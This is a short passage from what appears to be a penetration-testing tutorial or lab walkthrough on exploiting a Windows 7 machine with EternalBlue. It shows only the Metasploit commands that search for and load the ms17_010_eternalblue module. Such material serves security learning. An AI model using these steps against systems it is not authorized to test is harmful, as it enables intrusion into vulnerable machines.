Exploitation with Eternal Blue Now with the information we have gathered throughout our reconnaissance and vulnerability assessment, we are ready to exploit our Windows 7 system!

Let’s search for the proper exploit.

```
msf5 > search type:exploit eternalblue We found the EternalBlue exploit for Windows 7!
```

Let’s load it into our console and see the info file.

```
msf5 > use exploit/windows/smb/ms17_010_eternalblue
msf5 > info
```